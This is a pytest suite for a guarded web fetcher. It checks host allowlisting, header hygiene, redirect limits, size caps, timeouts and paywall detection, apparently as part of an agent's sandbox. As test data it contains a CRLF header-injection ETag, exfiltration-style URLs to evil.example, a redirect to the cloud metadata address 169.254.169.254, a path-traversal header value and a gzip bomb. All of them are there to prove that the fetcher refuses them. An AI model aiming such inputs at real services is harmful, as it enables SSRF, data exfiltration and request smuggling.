"""The fetcher — the one place a socket is opened.

Half of these tests drive a **real** ``http.server`` on loopback: redirect
chains, a gzip bomb, a slow response, a 304 and a robots.txt are served over
an actual socket, so response parsing, the streaming caps and the timeouts
are exercised rather than mimed. The other half hand the fetcher a canned
socket, because the *request* — the exact bytes that go on the wire — is not
something a real server can assert for you.

No test here reaches the internet.
"""

from __future__ import annotations

import hashlib

import pytest

from tests._webfetch_fixtures import (
    FakeSocket,
    LocalSite,
    Route,
    gzip_bomb,
    http_response,
    load_policy,
    loopback_netguard,
)
from trialerror.webfetch import WebFetchRefused
from trialerror.webfetch.fetcher import CONTENT_TYPE_CLASSES, Fetcher, user_agent_for
from trialerror.webfetch.netguard import NetGuard
from trialerror.webfetch.policy import HostPacer
from trialerror.webfetch.urlcheck import normalize

PAGE = b"<html><head><title>A page</title></head><body>text</body></html>"
CAPPED_TOML = "\n".join(
    ['contact_mailto = "ops@example.com"', "min_host_interval_s = 0", 'max_html_bytes = "256KiB"', ""]
)
IMPATIENT_TOML = "\n".join(
    [
        'contact_mailto = "ops@example.com"',
        "min_host_interval_s = 0",
        "read_timeout_s = 0.25",
        "total_timeout_s = 5",
        "",
    ]
)
EXPECTED_ACCEPT = (
    "text/html,application/xhtml+xml;q=0.9,application/pdf;q=0.9,"
    "text/plain;q=0.8,text/markdown;q=0.8"
)


class FakeClock:
    def __init__(self) -> None:
        self.now = 0.0
        self.slept: list[float] = []

    def time(self) -> float:
        return self.now

    def sleep(self, seconds: float) -> None:
        self.slept.append(seconds)
        self.now += seconds


def fetcher_for(tmp_path, site: LocalSite, **policy_kwargs) -> Fetcher:
    policy = load_policy(tmp_path, **policy_kwargs)
    return Fetcher(policy, loopback_netguard(site.port))


def canned_fetcher(tmp_path, sock: FakeSocket, **policy_kwargs) -> Fetcher:
    policy = load_policy(tmp_path, **policy_kwargs)
    guard = NetGuard(
        resolver=lambda host, port: [(2, "93.184.216.34")],
        socket_factory=lambda address, port, timeout: sock,
    )
    return Fetcher(policy, guard)


# --------------------------------------------------------------------------
# the request that goes on the wire
# --------------------------------------------------------------------------


def test_the_request_is_exactly_the_fixed_header_set(tmp_path) -> None:
    """Design §4 T2. What is absent is the assertion: no ``Cookie``, no
    ``Referer``, no ``Authorization``, no body, and no API by which a caller
    could add one."""
    sock = FakeSocket(http_response(body=PAGE))
    fetcher = canned_fetcher(tmp_path, sock)
    fetcher.fetch("http://test.example/article?q=1")

    assert sock.request_lines == [
        "GET /article?q=1 HTTP/1.1",
        "Host: test.example",
        "User-Agent: trialerror-webfetch/1 (+mailto:ops@example.com)",
        f"Accept: {EXPECTED_ACCEPT}",
        "Accept-Encoding: gzip",
        "Connection: close",
        "",
        "",
    ]


@pytest.mark.parametrize("forbidden", ["cookie", "referer", "authorization", "origin", "x-"])
def test_no_request_ever_carries_an_identifying_header(tmp_path, forbidden: str) -> None:
    sock = FakeSocket(http_response(body=PAGE))
    canned_fetcher(tmp_path, sock).fetch("http://test.example/a")
    assert forbidden not in sock.request_text.lower()


def test_conditional_headers_are_replayed_when_supplied(tmp_path) -> None:
    sock = FakeSocket(http_response(status=304, body=b"", include_length=False))
    fetcher = canned_fetcher(tmp_path, sock)
    result = fetcher.fetch(
        "http://test.example/a",
        etag='W/"v1"',
        last_modified="Wed, 21 Oct 2026 07:28:00 GMT",
    )
    assert 'If-None-Match: W/"v1"' in sock.request_lines
    assert "If-Modified-Since: Wed, 21 Oct 2026 07:28:00 GMT" in sock.request_lines
    assert result.outcome == "unchanged"


def test_a_hostile_conditional_value_cannot_inject_a_header(tmp_path) -> None:
    """The stored ETag is this system's own record of a previous fetch, but
    it came from a remote host, so it is filtered to printable ASCII and
    capped before it goes back out."""
    sock = FakeSocket(http_response(body=PAGE))
    fetcher = canned_fetcher(tmp_path, sock)
    fetcher.fetch("http://test.example/a", etag='"a"\r\nX-Injected: yes')
    # The injected text survives as *text* inside one header value — which is
    # harmless — but the CRLF that would have made it a header of its own is
    # gone, so no line begins with it.
    assert not any(line.lower().startswith("x-injected") for line in sock.request_lines)
    assert 'If-None-Match: "a"X-Injected: yes' in sock.request_lines
    assert len(sock.request_lines) == 9, "no extra header line was created"


def test_an_oversized_conditional_value_is_truncated(tmp_path) -> None:
    sock = FakeSocket(http_response(body=PAGE))
    canned_fetcher(tmp_path, sock).fetch("http://test.example/a", etag="x" * 900)
    header = next(line for line in sock.request_lines if line.startswith("If-None-Match:"))
    assert len(header) == len("If-None-Match: ") + 256


def test_the_user_agent_identifies_honestly() -> None:
    assert user_agent_for("ops@example.com") == "trialerror-webfetch/1 (+mailto:ops@example.com)"


def test_the_user_agent_never_invents_a_contact() -> None:
    """A wrong address in a User-Agent is worse than none, so an unset or
    unusable contact leaves a plain — still honest — UA."""
    assert user_agent_for("") == "trialerror-webfetch/1"
    assert user_agent_for("not-an-address") == "trialerror-webfetch/1"
    assert "\n" not in user_agent_for("ops@example.com\r\nX: y")


def test_the_host_header_carries_the_name_not_the_pinned_address(tmp_path) -> None:
    sock = FakeSocket(http_response(body=PAGE))
    canned_fetcher(tmp_path, sock).fetch("http://test.example/a")
    assert "Host: test.example" in sock.request_lines
    assert "93.184.216.34" not in sock.request_text


# --------------------------------------------------------------------------
# host policy on the way in
# --------------------------------------------------------------------------


def test_an_unapproved_host_is_refused_before_any_lookup(tmp_path) -> None:
    resolved: list[str] = []

    def resolver(host, port):
        resolved.append(host)
        raise AssertionError("an unapproved host must not produce a DNS query")

    policy = load_policy(tmp_path)
    fetcher = Fetcher(policy, NetGuard(resolver=resolver))
    with pytest.raises(WebFetchRefused) as caught:
        fetcher.fetch("https://evil.example/drop?data=secret")
    assert caught.value.reason == "host_not_allowed"
    assert resolved == []


def test_an_agent_origin_url_loses_its_query_on_a_plain_host(tmp_path) -> None:
    sock = FakeSocket(http_response(body=PAGE))
    fetcher = canned_fetcher(tmp_path, sock)
    result = fetcher.fetch("http://test.example/a?leak=corpus", origin="agent")
    assert result.query_stripped is True
    assert "GET /a HTTP/1.1" in sock.request_lines


def test_the_keep_query_flag_lets_an_agent_url_keep_it(tmp_path) -> None:
    sock = FakeSocket(http_response(body=PAGE))
    fetcher = canned_fetcher(tmp_path, sock, hosts="test.example http keep-query\n")
    result = fetcher.fetch("http://test.example/a?q=1", origin="agent")
    assert result.query_stripped is False
    assert "GET /a?q=1 HTTP/1.1" in sock.request_lines


def test_an_operator_list_url_always_keeps_its_query(tmp_path) -> None:
    sock = FakeSocket(http_response(body=PAGE))
    fetcher = canned_fetcher(tmp_path, sock)
    assert fetcher.fetch("http://test.example/a?q=1").query_stripped is False


def test_a_git_manifest_never_reaches_the_http_path(tmp_path) -> None:
    fetcher = canned_fetcher(tmp_path, FakeSocket(http_response()))
    with pytest.raises(WebFetchRefused) as caught:
        fetcher.fetch("https://repos.example/o/r", kind="git")
    assert caught.value.reason == "git_url_shape"


def test_the_host_rule_that_approved_the_fetch_is_recorded(tmp_path) -> None:
    sock = FakeSocket(http_response(body=PAGE))
    result = canned_fetcher(tmp_path, sock).fetch("http://test.example/a")
    assert result.host_rule.startswith("allowed-hosts.conf:")


# --------------------------------------------------------------------------
# a real server: the happy path
# --------------------------------------------------------------------------


def test_a_page_is_fetched_with_its_provenance(tmp_path) -> None:
    with LocalSite({"/article": Route(body=PAGE, headers={"Server": "fixture"})}) as site:
        result = fetcher_for(tmp_path, site).fetch("http://test.example/article")

    assert result.outcome == "fetched"
    assert result.body == PAGE
    assert result.content_class == "html"
    assert result.http_status == 200
    assert result.sha256 == hashlib.sha256(PAGE).hexdigest()
    assert result.resolved_ips == ("127.0.0.1",)
    assert result.bytes_out > 0
    assert result.headers_subset["server"] == "fixture"
    assert result.final_url.url == "http://test.example/article"


def test_only_the_fixed_header_keys_are_kept(tmp_path) -> None:
    """A header the remote invents cannot create a key in the provenance
    record (design §4 T3)."""
    route = Route(body=PAGE, headers={"X-Sneaky": "../../etc/passwd", "ETag": '"v7"'})
    with LocalSite({"/a": route}) as site:
        result = fetcher_for(tmp_path, site).fetch("http://test.example/a")
    assert result.headers_subset["etag"] == '"v7"'
    assert "x-sneaky" not in result.headers_subset


def test_a_header_value_is_filtered_to_printable_ascii(tmp_path) -> None:
    with LocalSite({"/a": Route(body=PAGE, headers={"Cache-Control": "max-age=1\tx"})}) as site:
        result = fetcher_for(tmp_path, site).fetch("http://test.example/a")
    assert "\t" not in (result.headers_subset["cache-control"] or "")


@pytest.mark.parametrize(
    "content_type,expected",
    [
        ("text/html; charset=utf-8", "html"),
        ("application/xhtml+xml", "html"),
        ("text/plain", "text"),
        ("text/markdown", "text"),
        ("application/pdf", "pdf"),
    ],
)
def test_each_allowed_media_type_maps_to_its_class(tmp_path, content_type, expected) -> None:
    body = b"%PDF-1.4 x" if expected == "pdf" else b"plain"
    with LocalSite({"/a": Route(body=body, content_type=content_type)}) as site:
        result = fetcher_for(tmp_path, site).fetch("http://test.example/a")
    assert result.content_class == expected


@pytest.mark.parametrize(
    "content_type", ["application/octet-stream", "image/png", "application/zip", ""]
)
def test_a_media_type_nobody_will_parse_is_refused(tmp_path, content_type) -> None:
    with LocalSite({"/a": Route(body=b"x", content_type=content_type or None)}) as site:
        with pytest.raises(WebFetchRefused) as caught:
            fetcher_for(tmp_path, site).fetch("http://test.example/a")
    assert caught.value.reason == "content_type_disallowed"
    assert set(CONTENT_TYPE_CLASSES) >= {"text/html", "application/pdf"}


def test_a_pdf_served_as_html_is_a_magic_mismatch(tmp_path) -> None:
    with LocalSite({"/a": Route(body=b"%PDF-1.7 body", content_type="text/html")}) as site:
        with pytest.raises(WebFetchRefused) as caught:
            fetcher_for(tmp_path, site).fetch("http://test.example/a")
    assert caught.value.reason == "magic_mismatch"


def test_html_served_as_a_pdf_is_a_magic_mismatch(tmp_path) -> None:
    with LocalSite(
        {"/a": Route(body=b"<!DOCTYPE html><html></html>", content_type="application/pdf")}
    ) as site:
        with pytest.raises(WebFetchRefused) as caught:
            fetcher_for(tmp_path, site).fetch("http://test.example/a")
    assert caught.value.reason == "magic_mismatch"


def test_html_without_a_marker_is_not_a_mismatch(tmp_path) -> None:
    """Absence of a marker is not evidence of anything — plenty of real HTML
    starts with a comment or a bare ``<div>``, and refusing on absence would
    turn a heuristic into an outage."""
    with LocalSite({"/a": Route(body=b"<div>fragment</div>")}) as site:
        result = fetcher_for(tmp_path, site).fetch("http://test.example/a")
    assert result.content_class == "html"


# --------------------------------------------------------------------------
# a real server: redirects
# --------------------------------------------------------------------------


def redirect(location: str, status: int = 302) -> Route:
    return Route(status=status, body=b"", content_type=None, headers={"Location": location})


def test_a_redirect_chain_is_followed_and_recorded(tmp_path) -> None:
    routes = {
        "/one": redirect("/two", 301),
        "/two": redirect("http://test.example/three", 307),
        "/three": Route(body=PAGE),
    }
    with LocalSite(routes) as site:
        result = fetcher_for(tmp_path, site).fetch("http://test.example/one")
    assert result.outcome == "fetched"
    assert result.final_url.url == "http://test.example/three"
    assert result.redirect_chain == (
        "http://test.example/two",
        "http://test.example/three",
    )


def test_a_redirect_loop_stops_at_the_limit(tmp_path) -> None:
    with LocalSite({"/loop": redirect("/loop")}) as site:
        with pytest.raises(WebFetchRefused) as caught:
            fetcher_for(tmp_path, site).fetch("http://test.example/loop")
    assert caught.value.reason == "redirect_limit"


def test_the_redirect_limit_is_the_configured_one(tmp_path) -> None:
    with LocalSite({"/loop": redirect("/loop")}) as site:
        policy = load_policy(tmp_path, toml="max_redirects = 2\nmin_host_interval_s = 0\n")
        fetcher = Fetcher(policy, loopback_netguard(site.port))
        with pytest.raises(WebFetchRefused):
            fetcher.fetch("http://test.example/loop")
    assert len(site.paths) == 3, "one original request plus two permitted hops"


def test_a_redirect_to_an_unapproved_host_is_refused(tmp_path) -> None:
    """A site cannot bounce this fetcher onto a host the operator never
    saw — that would be the URL-as-exfil channel reopened by the remote."""
    with LocalSite({"/off": redirect("http://evil.example/collect?x=1")}) as site:
        with pytest.raises(WebFetchRefused) as caught:
            fetcher_for(tmp_path, site).fetch("http://test.example/off")
    assert caught.value.reason == "redirect_off_allowlist"
    assert caught.value.context["host"] == "evil.example"


def test_a_redirect_to_a_literal_is_refused_by_shape(tmp_path) -> None:
    with LocalSite({"/meta": redirect("http://169.254.169.254/latest/meta-data/")}) as site:
        with pytest.raises(WebFetchRefused) as caught:
            fetcher_for(tmp_path, site).fetch("http://test.example/meta")
    assert caught.value.reason == "ip_literal"


@pytest.mark.parametrize(
    "location",
    ["http://[::1/x", "http://[::ffff:169.254.169.254/latest/meta-data/"],
    ids=["loopback", "metadata"],
)
def test_a_redirect_to_an_unparseable_location_is_a_refusal_not_a_crash(
    tmp_path, location: str
) -> None:
    """lane a fix pass (CONT-2): the remote half of the same ValueError.

    ``urljoin``/``urlsplit`` RAISE on an unbalanced IPv6 bracket rather than
    returning something refusable, and a bare ``ValueError`` is outside this
    package's contract: it escaped ``fetch`` entirely, so the attempt ended
    in no ``result.json`` and no audit line, and the sidecar took it for an
    unmodelled crash. No agent is needed for this one — an allowlisted site
    writes ``Location`` itself.
    """
    with LocalSite({"/hop": redirect(location)}) as site:
        with pytest.raises(WebFetchRefused) as caught:
            fetcher_for(tmp_path, site).fetch("http://test.example/hop")
    assert caught.value.reason == "host_syntax"
    assert caught.value.context["host"] == "test.example"


def test_a_redirect_to_another_approved_host_is_followed(tmp_path) -> None:
    routes = {"/hop": redirect("http://other.example/landing"), "/landing": Route(body=PAGE)}
    with LocalSite(routes) as site:
        result = fetcher_for(tmp_path, site).fetch("http://test.example/hop")
    assert result.final_url.host == "other.example"


def test_https_is_never_downgraded_to_http_by_a_redirect(tmp_path) -> None:
    """The hop rule in isolation: the fixture speaks plain HTTP, so this is
    the one control that cannot be driven end to end against it."""
    policy = load_policy(tmp_path)
    fetcher = Fetcher(policy, NetGuard())
    current = normalize("https://test.example/secure")
    with pytest.raises(WebFetchRefused) as caught:
        fetcher._next_hop(current, "http://test.example/plain", origin="operator_list")
    assert caught.value.reason == "redirect_downgrade"


def test_conditional_headers_are_not_replayed_to_another_host(tmp_path) -> None:
    """An ETag is a value the *previous* host chose; sending it elsewhere
    would leak it."""
    routes = {"/hop": redirect("http://other.example/landing"), "/landing": Route(body=PAGE)}
    with LocalSite(routes) as site:
        fetcher_for(tmp_path, site).fetch("http://test.example/hop", etag='"secret-token"')
    landing_headers = next(headers for path, headers in site.requests if path == "/landing")
    assert "If-None-Match" not in landing_headers


def test_a_redirect_without_a_location_is_a_broken_response(tmp_path) -> None:
    with LocalSite({"/nowhere": Route(status=302, body=b"", content_type=None)}) as site:
        with pytest.raises(WebFetchRefused) as caught:
            fetcher_for(tmp_path, site).fetch("http://test.example/nowhere")
    assert caught.value.reason == "http_error"
    assert caught.value.context["http_status"] == 302


# --------------------------------------------------------------------------
# a real server: caps
# --------------------------------------------------------------------------


def test_a_body_over_the_cap_is_refused_while_streaming(tmp_path) -> None:
    """No ``Content-Length`` at all: the cap has to hold on the stream, not
    on a number the remote supplied."""
    route = Route(body=b"x" * 300_000, omit_content_length=True)
    with LocalSite({"/big": route}) as site:
        with pytest.raises(WebFetchRefused) as caught:
            fetcher_for(tmp_path, site, toml=CAPPED_TOML).fetch("http://test.example/big")
    assert caught.value.reason == "too_large"


def test_a_declared_content_length_over_the_cap_is_refused_before_reading(tmp_path) -> None:
    """The discriminator: the body is tiny and the declaration is enormous.
    A fetcher that read first would succeed here; refusing proves the
    pre-check ran."""
    route = Route(body=b"tiny", declared_length=900_000)
    with LocalSite({"/lying": route}) as site:
        with pytest.raises(WebFetchRefused) as caught:
            fetcher_for(tmp_path, site, toml=CAPPED_TOML).fetch("http://test.example/lying")
    assert caught.value.reason == "too_large"


def test_a_gzip_bomb_is_named_a_bomb_not_an_oversize_body(tmp_path) -> None:
    """The two call for different responses from whoever reads the audit
    log, so the ratio is checked before the absolute cap."""
    bomb = gzip_bomb(8 * 1024 * 1024)
    route = Route(body=b"", content_type="text/html")
    with LocalSite({"/bomb": route}) as site:
        site.add(
            "/bomb",
            Route(
                body=b"\0" * (8 * 1024 * 1024),
                content_type="text/html",
                gzip_body=True,
            ),
        )
        with pytest.raises(WebFetchRefused) as caught:
            fetcher_for(tmp_path, site, toml=CAPPED_TOML).fetch("http://test.example/bomb")
    assert caught.value.reason == "decompress_bomb"
    assert len(bomb) < 64 * 1024, "the fixture is only a bomb if it is small on the wire"


def test_an_ordinary_gzipped_page_is_decoded_normally(tmp_path) -> None:
    with LocalSite({"/z": Route(body=PAGE, gzip_body=True)}) as site:
        result = fetcher_for(tmp_path, site).fetch("http://test.example/z")
    assert result.body == PAGE


def test_a_content_encoding_that_was_never_offered_is_refused(tmp_path) -> None:
    route = Route(body=b"x", headers={"Content-Encoding": "br"})
    with LocalSite({"/br": route}) as site:
        with pytest.raises(WebFetchRefused) as caught:
            fetcher_for(tmp_path, site).fetch("http://test.example/br")
    assert caught.value.reason == "content_type_disallowed"


def test_a_slow_server_times_out(tmp_path) -> None:
    with LocalSite({"/slow": Route(body=PAGE, delay_s=1.5)}) as site:
        with pytest.raises(WebFetchRefused) as caught:
            fetcher_for(tmp_path, site, toml=IMPATIENT_TOML).fetch("http://test.example/slow")
    assert caught.value.reason == "timeout"


def test_the_total_time_budget_is_enforced_across_hops(tmp_path) -> None:
    clock = FakeClock()
    routes = {"/a": redirect("/b"), "/b": redirect("/c"), "/c": Route(body=PAGE)}
    with LocalSite(routes) as site:
        policy = load_policy(tmp_path, toml="total_timeout_s = 1\nmin_host_interval_s = 0\n")
        fetcher = Fetcher(
            policy,
            loopback_netguard(site.port),
            _time_fn=clock.time,
            _sleep_fn=clock.sleep,
        )
        original = fetcher._request

        def slow_request(*args, **kwargs):
            clock.now += 0.6
            return original(*args, **kwargs)

        fetcher._request = slow_request  # type: ignore[method-assign]
        with pytest.raises(WebFetchRefused) as caught:
            fetcher.fetch("http://test.example/a")
    assert caught.value.reason == "timeout"


# --------------------------------------------------------------------------
# a real server: statuses
# --------------------------------------------------------------------------


def test_a_304_is_unchanged_with_no_body(tmp_path) -> None:
    with LocalSite({"/a": Route(body=PAGE, etag='"v1"')}) as site:
        result = fetcher_for(tmp_path, site).fetch("http://test.example/a", etag='"v1"')
    assert result.outcome == "unchanged"
    assert result.body == b""
    assert result.sha256 is None
    assert result.content_class is None


def test_a_changed_page_comes_back_in_full(tmp_path) -> None:
    with LocalSite({"/a": Route(body=PAGE, etag='"v2"')}) as site:
        result = fetcher_for(tmp_path, site).fetch("http://test.example/a", etag='"v1"')
    assert result.outcome == "fetched" and result.body == PAGE


def test_a_plain_404_is_an_http_error(tmp_path) -> None:
    with LocalSite({}) as site:
        with pytest.raises(WebFetchRefused) as caught:
            fetcher_for(tmp_path, site).fetch("http://test.example/missing")
    assert caught.value.reason == "http_error"
    assert caught.value.context["http_status"] == 404


def test_a_cloudflare_interstitial_is_a_bot_challenge_and_nothing_is_evaded(tmp_path) -> None:
    route = Route(status=403, body=b"<html><title>Just a moment...</title></html>")
    with LocalSite({"/a": route}) as site:
        with pytest.raises(WebFetchRefused) as caught:
            fetcher_for(tmp_path, site).fetch("http://test.example/a")
        assert len(site.paths) == 1, "no second attempt by another route — ever"
    assert caught.value.reason == "bot_challenge"


def test_the_cf_mitigated_header_alone_is_enough(tmp_path) -> None:
    route = Route(status=403, body=b"nope", headers={"cf-mitigated": "challenge"})
    with LocalSite({"/a": route}) as site:
        with pytest.raises(WebFetchRefused) as caught:
            fetcher_for(tmp_path, site).fetch("http://test.example/a")
    assert caught.value.reason == "bot_challenge"


def test_a_substack_style_wall_is_a_paywall(tmp_path) -> None:
    route = Route(status=403, body=b"<html>This post is for paid subscribers</html>")
    with LocalSite({"/a": route}) as site:
        with pytest.raises(WebFetchRefused) as caught:
            fetcher_for(tmp_path, site).fetch("http://test.example/a")
    assert caught.value.reason == "paywalled"


def test_a_402_is_a_paywall_even_without_markers(tmp_path) -> None:
    with LocalSite({"/a": Route(status=402, body=b"pay up")}) as site:
        with pytest.raises(WebFetchRefused) as caught:
            fetcher_for(tmp_path, site).fetch("http://test.example/a")
    assert caught.value.reason == "paywalled"


def test_an_enormous_error_page_does_not_become_too_large(tmp_path) -> None:
    """A chatty 403 must still be reported as a 403; the body is read only to
    recognise a wall, and stops rather than refusing."""
    route = Route(status=403, body=b"z" * 200_000)
    with LocalSite({"/a": route}) as site:
        with pytest.raises(WebFetchRefused) as caught:
            fetcher_for(tmp_path, site, toml=CAPPED_TOML).fetch("http://test.example/a")
    assert caught.value.reason == "http_error"


def test_a_500_is_retried_with_backoff_then_reported(tmp_path) -> None:
    clock = FakeClock()
    with LocalSite({"/a": Route(status=503, body=b"later")}) as site:
        policy = load_policy(tmp_path)
        fetcher = Fetcher(
            policy,
            loopback_netguard(site.port),
            _time_fn=clock.time,
            _sleep_fn=clock.sleep,
        )
        with pytest.raises(WebFetchRefused) as caught:
            fetcher.fetch("http://test.example/a")
        assert len(site.paths) == 5, "five tries, per the design"
    assert caught.value.reason == "http_error"
    assert clock.slept == [1.0, 2.0, 4.0, 8.0]


def test_a_retry_after_header_is_honoured_within_its_cap(tmp_path) -> None:
    clock = FakeClock()
    patient = "min_host_interval_s = 0\ntotal_timeout_s = 100000\n"
    with LocalSite({"/a": Route(status=429, body=b"", headers={"Retry-After": "500"})}) as site:
        fetcher = Fetcher(
            load_policy(tmp_path, toml=patient),
            loopback_netguard(site.port),
            _time_fn=clock.time,
            _sleep_fn=clock.sleep,
        )
        with pytest.raises(WebFetchRefused):
            fetcher.fetch("http://test.example/a")
    assert clock.slept == [120.0, 120.0, 120.0, 120.0], "capped at two minutes"


def test_backoff_never_outlives_the_total_time_budget(tmp_path) -> None:
    """A host that keeps asking for two minutes does not get to hold a
    single-threaded sidecar for ten."""
    clock = FakeClock()
    with LocalSite({"/a": Route(status=429, body=b"", headers={"Retry-After": "500"})}) as site:
        fetcher = Fetcher(
            load_policy(tmp_path),  # total_timeout_s = 90 by default
            loopback_netguard(site.port),
            _time_fn=clock.time,
            _sleep_fn=clock.sleep,
        )
        with pytest.raises(WebFetchRefused) as caught:
            fetcher.fetch("http://test.example/a")
    assert caught.value.reason == "timeout"
    assert clock.slept == [120.0]


def test_a_transient_failure_that_clears_is_not_a_refusal(tmp_path) -> None:
    clock = FakeClock()
    with LocalSite({"/a": Route(status=503, body=b"")}) as site:
        fetcher = Fetcher(
            load_policy(tmp_path),
            loopback_netguard(site.port),
            _time_fn=clock.time,
            _sleep_fn=clock.sleep,
        )

        calls = {"n": 0}
        original = fetcher._request

        def flaky(*args, **kwargs):
            calls["n"] += 1
            if calls["n"] == 2:
                site.add("/a", Route(body=PAGE))
            return original(*args, **kwargs)

        fetcher._request = flaky  # type: ignore[method-assign]
        result = fetcher.fetch("http://test.example/a")
    assert result.outcome == "fetched"
    assert clock.slept == [1.0]


# --------------------------------------------------------------------------
# pacing
# --------------------------------------------------------------------------


def test_the_pacer_is_consulted_before_every_socket(tmp_path) -> None:
    """Redirect hops and robots.txt are requests too, so all of them pace."""
    clock = FakeClock()
    routes = {"/one": redirect("/two"), "/two": Route(body=PAGE)}
    with LocalSite(routes) as site:
        policy = load_policy(tmp_path, toml='contact_mailto = "ops@example.com"\n')
        pacer = HostPacer(3.0, _time_fn=clock.time, _sleep_fn=clock.sleep)
        fetcher = Fetcher(
            policy,
            loopback_netguard(site.port),
            pacer=pacer,
            _time_fn=clock.time,
            _sleep_fn=clock.sleep,
        )
        fetcher.fetch("http://test.example/one")
    assert clock.slept == [pytest.approx(3.0)], "the second hop waited out the interval"


# --------------------------------------------------------------------------
# robots.txt over the same transport
# --------------------------------------------------------------------------


def test_robots_is_fetched_through_the_same_policy(tmp_path) -> None:
    robots = Route(body=b"User-agent: *\nDisallow: /private\n", content_type="text/plain")
    with LocalSite({"/robots.txt": robots}) as site:
        fetcher = fetcher_for(tmp_path, site)
        document = fetcher.fetch_robots(normalize("http://test.example/robots.txt", allow_http=True))
    assert document.status == 200
    assert "Disallow: /private" in document.text
    assert site.paths == ["/robots.txt"]


def test_a_missing_robots_file_returns_its_status_unjudged(tmp_path) -> None:
    """"What a 404 means" is the robots module's decision, not the
    transport's."""
    with LocalSite({}) as site:
        document = fetcher_for(tmp_path, site).fetch_robots(
            normalize("http://test.example/robots.txt", allow_http=True)
        )
    assert document.status == 404
    assert document.text == ""


def test_robots_accepts_plain_text_only(tmp_path) -> None:
    with LocalSite({"/robots.txt": Route(body=b"User-agent: *\n", content_type="text/plain")}) as site:
        fetcher_for(tmp_path, site).fetch_robots(
            normalize("http://test.example/robots.txt", allow_http=True)
        )
    _path, headers = site.requests[0]
    assert headers["Accept"] == "text/plain"


CAPPED_TOML = (
    'contact_mailto = "ops@example.com"\nmin_host_interval_s = 0\nmax_html_bytes = "256KiB"\n'
)
IMPATIENT_TOML = (
    'contact_mailto = "ops@example.com"\nmin_host_interval_s = 0\n'
    "read_timeout_s = 0.25\ntotal_timeout_s = 5\n"
)
